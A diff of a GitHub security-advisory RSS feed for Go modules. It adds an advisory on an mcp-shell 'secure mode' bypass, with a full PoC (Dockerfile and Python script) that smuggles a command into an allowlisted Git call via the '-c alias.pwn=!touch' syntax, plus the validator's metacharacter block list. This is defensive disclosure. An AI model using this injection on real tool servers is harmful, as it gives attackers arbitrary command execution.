@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-08-25T14:57:58.942Z</updated>
+    <updated>2026-08-25T15:42:10.838Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,406 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/sonirico/mcp-shell] mcp-shell has a Secure Mode Allowlist Bypass via Git Shell Alias]]></title>
+        <id>https://github.com/advisories/GHSA-74hp-mggr-hv58</id>
+        <link href="https://github.com/advisories/GHSA-74hp-mggr-hv58"/>
+        <updated>2026-08-25T15:39:07.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>mcp-shell</code>'s "secure mode" is designed to restrict command execution to an allowlist of executables defined in <code>security.yaml</code>. The default configuration includes <code>/usr/bin/git</code>. The security validator in <code>security.go</code> blocks common shell metacharacters (<code>|&amp;;&lt;&gt;(){}[]$\``) but omits </code>!<code>, which is the prefix Git uses to execute shell aliases (</code>alias.NAME=!CMD<code>). An attacker who can invoke the </code>shell_exec<code>MCP tool can pass</code>/usr/bin/git -c alias.pwn=!<code>as the command argument, bypassing all validation and achieving arbitrary OS command execution as the</code>mcp-shell<code>process user. The default Docker image runs as</code>mcpuser` (UID 1000) with Git installed and secure mode enabled, making this exploitable in the default deployment with no authentication required.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerability is a classic OS Command Injection (CWE-78) in the <code>shell_exec</code> MCP tool handler. The data flow from attacker input to shell execution is:</p>
+<ol>
+<li><strong><code>main.go:89-91</code></strong> — The MCP tool schema exposes a required string parameter <code>command</code> with no server-side type constraints.</li>
+<li><strong><code>main.go:102</code></strong> — <code>shell_exec</code> is bound to <code>shellHandler.handle</code>.</li>
+<li><strong><code>handler.go:34</code></strong> — The handler reads the attacker-controlled value: <code>command, err := request.RequireString("command")</code>.</li>
+<li><strong><code>handler.go:49</code></strong> — The command string is passed to <code>h.validator.validateCommand(command)</code>.</li>
+<li><strong><code>security.go:136</code></strong> — <code>containsShellMetacharacters</code> checks for <code>|&amp;;&lt;&gt;(){}[]$\`` but </code>!` is absent from the blocked set.</li>
+<li><strong><code>security.go:147-149</code></strong> — <code>containsDangerousShellConstructs</code> also does not include <code>!</code>.</li>
+<li><strong><code>security.go:85-96</code></strong> — <code>/usr/bin/git</code> matches <code>AllowedExecutables</code>; no per-argument policy exists for Git. The <code>blocked_patterns</code> list in <code>security.yaml:35</code> is empty (<code>[]</code>).</li>
+<li><strong><code>handler.go:59</code></strong> — The fully validated (but unsafe) command is forwarded to <code>h.executor.execute</code>.</li>
+<li><strong><code>executor.go:149-163</code></strong> — <code>parseCommand</code> splits the string with <code>strings.Fields</code>; <code>exec.CommandContext(ctx, executable, args...)</code> is called with <code>executable="/usr/bin/git"</code> and <code>args=["-c", "alias.pwn=!touch", "pwn", "/tmp/target"]</code>.</li>
+<li><strong><code>executor.go:199</code></strong> — <code>cmd.Run()</code> launches <code>git</code>. Git interprets <code>-c alias.pwn=!touch</code> as a runtime configuration entry, defining the alias <code>pwn</code> as the shell command <code>touch</code>. When Git resolves the subcommand <code>pwn</code>, it triggers the shell alias: <code>sh -c 'touch "$@"' _ /tmp/target</code>, creating the file.</li>
+</ol>
+<p>The root cause is the missing <code>!</code> in the metacharacter blocklist and the absence of any per-executable argument policy that would prevent Git's <code>-c alias.*=!</code> pattern.</p>
+<p>Incriminated source locations:</p>
+<ul>
+<li><code>security.go:136</code> — metacharacter set missing <code>!</code></li>
+<li><code>security.go:147-149</code> — <code>containsDangerousShellConstructs</code> missing <code>!</code></li>
+<li><code>security.yaml:27</code> — <code>/usr/bin/git</code> in <code>allowed_executables</code></li>
+<li><code>security.yaml:35</code> — <code>blocked_patterns: []</code></li>
+<li><code>executor.go:149-163,199</code> — direct <code>exec.CommandContext</code> invocation with unsanitized Git arguments</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<p><strong>Prerequisites:</strong></p>
+<ul>
+<li>Docker installed and the <code>mcp-shell-vuln-001</code> image built from the provided <code>Dockerfile</code> (repo root as build context, commit <code>c30862f</code>).</li>
+<li>Python 3 to run <code>poc.py</code>.</li>
+</ul>
+<p><strong>Build the Docker image:</strong></p>
+<pre><code class="language-bash">docker build -f vuln-001/Dockerfile -t mcp-shell-vuln-001 .
+</code></pre>
+<p><strong>Run the PoC:</strong></p>
+<pre><code class="language-bash">python3 vuln-001/poc.py
+</code></pre>
+<p>The script performs the full MCP JSON-RPC handshake over stdin and sends the following <code>tools/call</code> request:</p>
+<pre><code class="language-json">{
+  "jsonrpc": "2.0",
+  "id": 2,
+  "method": "tools/call",
+  "params": {
+    "name": "shell_exec",
+    "arguments": {
+      "command": "/usr/bin/git -c alias.pwn=!touch pwn /tmp/mcp-shell-mcp-poc",
+      "base64": false
+    }
+  }
+}
+</code></pre>
+<p>The container's <code>/tmp</code> is bind-mounted to a host temporary directory so the evidence file can be observed on the host without <code>docker exec</code>.</p>
+<p><strong>Expected result:</strong></p>
+<ul>
+<li>MCP response: <code>{"status":"success","exit_code":0,"execution_time":"~3ms","security_info":{"security_enabled":true,...}}</code></li>
+<li>Evidence file created at <code>&lt;host_tmp&gt;/mcp-shell-mcp-poc</code> with <code>uid=1000</code> (mcpuser), confirming arbitrary shell command execution inside the container.</li>
+</ul>
+<p><strong>Validation bypass explanation:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Check</th>
+<th>Value tested</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>containsShellMetacharacters</code></td>
+<td><code>alias.pwn=!touch</code></td>
+<td><code>false</code> — <code>!</code> not in blocklist</td>
+</tr>
+<tr>
+<td><code>containsDangerousShellConstructs</code></td>
+<td><code>alias.pwn=!touch</code></td>
+<td><code>false</code> — <code>!</code> not in blocklist</td>
+</tr>
+<tr>
+<td><code>matchesExecutable</code></td>
+<td><code>/usr/bin/git</code></td>
+<td><code>true</code> — in <code>AllowedExecutables</code></td>
+</tr>
+</tbody></table>
+<p>All checks pass; <code>git</code> receives <code>alias.pwn=!touch</code> as a config entry and executes <code>touch</code> as a shell alias.</p>
+<h3 id="impact">Impact</h3>
+<p>This is an <strong>OS Command Injection</strong> vulnerability (CWE-78). Any entity that can issue an MCP <code>tools/call</code> request to a <code>mcp-shell</code> instance running with the default Docker configuration can execute arbitrary OS commands as the <code>mcpuser</code> process account (UID 1000) inside the container.</p>
+<p>The default Docker deployment sets <code>MCP_SHELL_SEC_CONFIG_FILE=/etc/mcp-shell/security.yaml</code>, installs <code>git</code>, and runs as <code>mcpuser</code>. The <code>shell_exec</code> tool requires no additional authentication beyond MCP connectivity. "Secure mode" is explicitly marketed as the mechanism preventing command injection; this bypass nullifies that protection entirely.</p>
+<p>Impacted parties:</p>
+<ul>
+<li><strong>Users and operators</strong> who deploy the default <code>mcp-shell</code> Docker image and expose it to MCP clients (directly via stdio, or via an MCP bridge/proxy over the network).</li>
+<li><strong>AI agent systems</strong> that integrate <code>mcp-shell</code> as a tool provider, where a compromised or malicious LLM prompt could supply the exploit payload as the <code>command</code> argument.</li>
+</ul>
+<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
+<h4 id="dockerfile"><code>Dockerfile</code></h4>
+<pre><code class="language-dockerfile"># VULN-001: Secure Mode Allowlist Bypass via Git Shell Alias
+# CWE-78: OS Command Injection
+#
+# This Dockerfile reproduces the exact default Docker deployment environment of
+# sonirico/mcp-shell at commit c30862f that is affected by VULN-001.
+#
+# Vulnerability summary:
+#   - security.yaml allows /usr/bin/git in allowed_executables
+#   - The security validator (security.go) does not block '!' in arguments
+#   - Git's '-c alias.NAME=!CMD' syntax executes CMD as a shell command
+#   - This bypasses "secure mode" and achieves arbitrary command execution
+#
+# Build context must be the repo parent directory:
+#   docker build -f vuln-001/Dockerfile -t mcp-shell-vuln-001 .
+
+# Stage 1: Build the mcp-shell binary from the vulnerable source
+FROM golang:1.25-alpine AS builder
+
+RUN apk add --no-cache git ca-certificates
+
+WORKDIR /src
+
+# Download dependencies before copying source for better layer caching
+COPY repo/go.mod repo/go.sum ./
+RUN go mod download
+
+# Copy and build the vulnerable source
+COPY repo/*.go ./
+RUN CGO_ENABLED=0 GOOS=linux go build \
+    -ldflags "-s -w" \
+    -o mcp-shell .
+
+# Stage 2: Runtime environment matching the default mcp-shell Docker image
+FROM alpine:3.22
+
+# Install git — this is what the default Dockerfile does (apk add git),
+# and it is what makes the exploit possible: /usr/bin/git is present and
+# the security config allows it.
+RUN apk add --no-cache bash git
+
+# Create non-root user matching the default Docker image
+RUN addgroup -g 1000 mcpuser &amp;&amp; \
+    adduser -D -s /bin/bash -u 1000 -G mcpuser mcpuser
+
+# Install the mcp-shell binary
+COPY --from=builder /src/mcp-shell /usr/local/bin/mcp-shell
+
+# Install the default (vulnerable) security configuration.
+# Key properties that enable the exploit:
+#   allowed_executables includes /usr/bin/git
+#   blocked_patterns is empty
+#   security.go does not list '!' in blocked metacharacters
+COPY repo/security.yaml /etc/mcp-shell/security.yaml
+
+# Replicate the default environment variables from the repo Dockerfile
+ENV MCP_SHELL_SEC_CONFIG_FILE=/etc/mcp-shell/security.yaml
+ENV MCP_SHELL_LOG_FORMAT=json
+ENV PATH="/usr/local/bin:${PATH}"
+
+USER mcpuser
+WORKDIR /home/mcpuser
+
+# mcp-shell reads JSON-RPC over stdin and writes responses to stdout
+ENTRYPOINT ["mcp-shell"]
+</code></pre>
+<h4 id="pocpy"><code>poc.py</code></h4>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+Proof-of-Concept for VULN-001: Secure Mode Allowlist Bypass via Git Shell Alias
+Repository:  sonirico/mcp-shell (commit c30862f)
+CWE-78:      OS Command Injection
+
+Vulnerability:
+    mcp-shell "secure mode" uses security.yaml to allowlist executables.
+    The default config allows /usr/bin/git.  The security validator in
+    security.go checks for metacharacters (|&amp;;&lt;&gt;(){}[]$`\\) but does NOT
+    include '!' in the blocked set.  Git's -c flag accepts runtime config
+    overrides; setting 'alias.NAME=!CMD' defines a shell alias that runs
+    CMD as a shell command when 'NAME' is used as a git subcommand.
+
+Exploit payload (MCP tools/call -&gt; shell_exec argument):
+    /usr/bin/git -c alias.pwn=!touch pwn /tmp/mcp-shell-mcp-poc
+
+    Validation path (all checks pass):
+      containsShellMetacharacters("alias.pwn=!touch")  -&gt; False  (! not in set)
+      containsDangerousShellConstructs("alias.pwn=!touch") -&gt; False (! not in set)
+      matchesExecutable("/usr/bin/git", "/usr/bin/git") -&gt; True
+
+    Execution path:
+      exec.CommandContext(ctx, "/usr/bin/git",
+          "-c", "alias.pwn=!touch", "pwn", "/tmp/mcp-shell-mcp-poc")
+      -&gt; git defines alias pwn = !touch
+      -&gt; git runs subcommand "pwn" -&gt; triggers shell alias
+      -&gt; sh -c 'touch "$@"' _ /tmp/mcp-shell-mcp-poc
+      -&gt; file /tmp/mcp-shell-mcp-poc is created
+
+Evidence method:
+    The container's /tmp is bind-mounted to a host temporary directory.
+    After the MCP call, verify the evidence file exists on the host.
+
+Usage:
+    # From the repo parent directory:
+    docker build -f vuln-001/Dockerfile -t mcp-shell-vuln-001 .
+    python3 vuln-001/poc.py
+"""
+
+import json
+import os
+import subprocess
+import sys
+import tempfile
+import stat
+
+IMAGE_NAME = "mcp-shell-vuln-001"
+EVIDENCE_FILENAME = "mcp-shell-mcp-poc"
+EXPLOIT_TARGET = f"/tmp/{EVIDENCE_FILENAME}"
+
+# MCP JSON-RPC protocol requires:
+#   1. initialize handshake (client -&gt; server)
+#   2. notifications/initialized acknowledgement
+#   3. tools/call with the exploit payload
+MCP_INITIALIZE = json.dumps({
+    "jsonrpc": "2.0",
+    "id": 1,
+    "method": "initialize",
+    "params": {
+        "protocolVersion": "2024-11-05",
+        "capabilities": {},
+        "clientInfo": {"name": "vuln-001-poc", "version": "1.0.0"},
+    },
+})
+
+MCP_INITIALIZED = json.dumps({
+    "jsonrpc": "2.0",
+    "method": "notifications/initialized",
+})
+
+# The malicious command:
+#   /usr/bin/git    - allowed by security.yaml AllowedExecutables
+#   -c alias.pwn=!touch  - git runtime config; ! prefix = shell alias
+#                          NOT blocked: '!' absent from security.go metachars
+#   pwn             - triggers the alias (git subcommand lookup)
+#   /tmp/&lt;file&gt;     - argument forwarded to touch by git shell alias
+MCP_EXPLOIT = json.dumps({
+    "jsonrpc": "2.0",
+    "id": 2,
+    "method": "tools/call",
+    "params": {
+        "name": "shell_exec",
+        "arguments": {
+            "command": f"/usr/bin/git -c alias.pwn=!touch pwn {EXPLOIT_TARGET}",
+            "base64": False,
+        },
+    },
+})
+
+
+def run(args, **kwargs):
+    print(f"[*] {' '.join(str(a) for a in args)}")
+    return subprocess.run(args, **kwargs)
+
+
+def parse_mcp_response(stdout_text):
+    """Parse newline-delimited JSON-RPC responses, return the tools/call result."""
+    for line in stdout_text.splitlines():
+        line = line.strip()
+        if not line:
+            continue
+        try:
+            msg = json.loads(line)
+            if msg.get("id") == 2:
+                return msg
+        except json.JSONDecodeError:
+            pass
+    return None
+
+
+def main():
+    print("=" * 62)
+    print("VULN-001 PoC — mcp-shell Secure Mode Bypass via Git Alias")
+    print("=" * 62)
+    print()
+
+    # Create a host-side temporary directory that will be bind-mounted
+    # as /tmp inside the container.  This lets us observe file creation
+    # caused by the git shell alias without needing 'docker exec'.
+    host_tmp = tempfile.mkdtemp(prefix="mcp-vuln001-")
+    # Allow UID 1000 (mcpuser inside the container) to write files here.
+    os.chmod(host_tmp, 0o1777)
+    evidence_host_path = os.path.join(host_tmp, EVIDENCE_FILENAME)
+
+    print(f"[*] Host bind-mount (-&gt; /tmp inside container): {host_tmp}")
+    print(f"[*] Expected evidence file on host: {evidence_host_path}")
+    print()
+    print(f"[*] Exploit command (shell_exec argument):")
+    print(f"      /usr/bin/git -c alias.pwn=!touch pwn {EXPLOIT_TARGET}")
+    print()
+
+    # Build the newline-delimited JSON-RPC payload sent over stdin.
+    # mcp-shell reads one JSON object per line.
+    payload_bytes = (
+        MCP_INITIALIZE + "\n" +
+        MCP_INITIALIZED + "\n" +
+        MCP_EXPLOIT + "\n"
+    ).encode()
+
+    print("[*] Sending MCP JSON-RPC payload to container via stdin ...")
+    try:
+        proc = run(
+            [
+                "docker", "run",
+                "--rm",            # Remove container on exit
+                "-i",              # Keep stdin open for piped input
+                "--network=none",  # No external network access (safety)
+                "-v", f"{host_tmp}:/tmp",   # Expose container's /tmp on host
+                IMAGE_NAME,
+            ],
+            input=payload_bytes,
+            capture_output=True,
+            timeout=40,
+        )
+    except subprocess.TimeoutExpired:
+        print("[FAIL] docker run timed out after 40 seconds")
+        sys.exit(1)
+    except FileNotFoundError:
+        print("[FAIL] 'docker' not found — install Docker to run this PoC")
+        sys.exit(1)
+
+    stdout = proc.stdout.decode(errors="replace")
+    stderr = proc.stderr.decode(errors="replace")
+
+    print()
+    print("[*] Container stdout (MCP responses):")
+    for line in stdout.splitlines():
+        print(f"    {line}")
+
+    if stderr.strip():
+        print("[*] Container stderr:")
+        for line in stderr.splitlines():
+            print(f"    {line}")
+
+    print()
+
+    # Locate and pretty-print the tools/call MCP response.
+    exploit_response = parse_mcp_response(stdout)
+    if exploit_response:
+        print("[*] MCP tools/call response (id=2):")
+        print(json.dumps(exploit_response, indent=4))
+        print()
+
+    # --- Primary evidence check ---
+    if os.path.exists(evidence_host_path):
+        st = os.stat(evidence_host_path)
+        print(f"[PASS] Evidence file found on host: {evidence_host_path}")
+        print(f"       size={st.st_size}  mode={oct(st.st_mode)}  uid={st.st_uid}")
+        print()
+        print("[PASS] EXPLOIT SUCCESSFUL")
+        print("       'touch /tmp/mcp-shell-mcp-poc' was executed INSIDE the container")
+        print("       by the git shell alias, bypassing mcp-shell secure mode.")
+        passed = True
+        evidence = (
+            f"File '{evidence_host_path}' created on host via /tmp volume mount. "
+            f"size={st.st_size} uid={st.st_uid} mode={oct(st.st_mode)}. "
+            f"MCP response: {json.dumps(exploit_response) if exploit_response else 'n/a'}"
+        )
+    else:
+        print(f"[FAIL] Evidence file NOT found at: {evidence_host_path}")
+        print("[FAIL] EXPLOIT FAILED")
+        if exploit_response:
+            result_content = exploit_response.get("result", {})
+            print(f"       MCP result: {json.dumps(result_content)}")
+        passed = False
+        evidence = (
+            f"Evidence file was not created. "
+            f"stdout={stdout[:600]!r} stderr={stderr[:300]!r}"
+        )
+
+    print()
+    return passed, evidence
+
+
+if __name__ == "__main__":
+    passed, evidence = main()
+    sys.exit(0 if passed else 1)
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sonirico/mcp-shell/security/advisories/GHSA-74hp-mggr-hv58">https://github.com/sonirico/mcp-shell/security/advisories/GHSA-74hp-mggr-hv58</a></li>
+<li><a href="https://github.com/sonirico/mcp-shell/pull/16">https://github.com/sonirico/mcp-shell/pull/16</a></li>
+<li><a href="https://github.com/sonirico/mcp-shell/commit/f31377fce6ec31114e5a4398c0e5270552bce09f">https://github.com/sonirico/mcp-shell/commit/f31377fce6ec31114e5a4398c0e5270552bce09f</a></li>
+<li><a href="https://github.com/sonirico/mcp-shell/releases/tag/v0.6.0">https://github.com/sonirico/mcp-shell/releases/tag/v0.6.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-74hp-mggr-hv58">https://github.com/advisories/GHSA-74hp-mggr-hv58</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-74hp-mggr-hv58</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-25T15:39:05.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/googleapis/mcp-toolbox] MCP Toolbox for Databases has an Origin Validation Error]]></title>
         <id>https://github.com/advisories/GHSA-76g7-m3xw-x9gr</id>
@@ -852,41 +1252,6 @@ Content-Type: application/json
             <name>GitHub</name>
             <email>GitHub@noreply.github.com</email>
             <uri>https://github.com/advisories/GHSA-m2w9-h2mm-79qr</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-12T18:31:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost doesn't validate that a username returned during bot registration belongs to a bot account]]></title>
-        <id>https://github.com/advisories/GHSA-3vmp-whvv-5v9v</id>
-        <link href="https://github.com/advisories/GHSA-3vmp-whvv-5v9v"/>
-        <updated>2026-08-24T21:39:54.000Z</updated>
-        <content type="html"><![CDATA[<p>Mattermost versions 11.6.x &lt;= 11.6.1, 11.5.x &lt;= 11.5.4, 10.11.x &lt;= 10.11.15, 10.11.x &lt;= 10.11.16 fail to validate that a username returned during bot registration belongs to a bot account, which allows an unprivileged attacker to intercept private messages sent by plugins via direct message channels by pre-registering a user account with a predictable plugin bot username. Mattermost Advisory ID: MMSA-2026-00649</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6046">https://nvd.nist.gov/vuln/detail/CVE-2026-6046</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36064">https://github.com/mattermost/mattermost/pull/36064</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36305">https://github.com/mattermost/mattermost/pull/36305</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36317">https://github.com/mattermost/mattermost/pull/36317</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36318">https://github.com/mattermost/mattermost/pull/36318</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36320">https://github.com/mattermost/mattermost/pull/36320</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/3be10297c14d272f273d747af70728f9d03c60ec">https://github.com/mattermost/mattermost/commit/3be10297c14d272f273d747af70728f9d03c60ec</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/98f9778cec1e7f3d97b3d4692fb91f8e7b659972">https://github.com/mattermost/mattermost/commit/98f9778cec1e7f3d97b3d4692fb91f8e7b659972</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/aba9339a24d4b287edd77377c19901d6e341bb96">https://github.com/mattermost/mattermost/commit/aba9339a24d4b287edd77377c19901d6e341bb96</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/c79c3831061a0880c0962c7d567c9e24dd35f44c">https://github.com/mattermost/mattermost/commit/c79c3831061a0880c0962c7d567c9e24dd35f44c</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/f706d1f01e6dfe62cab86c1d257f237daa78106a">https://github.com/mattermost/mattermost/commit/f706d1f01e6dfe62cab86c1d257f237daa78106a</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v10.11.16">https://github.com/mattermost/mattermost/releases/tag/v10.11.16</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.5.5">https://github.com/mattermost/mattermost/releases/tag/v11.5.5</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.6.2">https://github.com/mattermost/mattermost/releases/tag/v11.6.2</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.7.0">https://github.com/mattermost/mattermost/releases/tag/v11.7.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-3vmp-whvv-5v9v">https://github.com/advisories/GHSA-3vmp-whvv-5v9v</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3vmp-whvv-5v9v</uri>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-06-12T18:31:59.000Z</published>
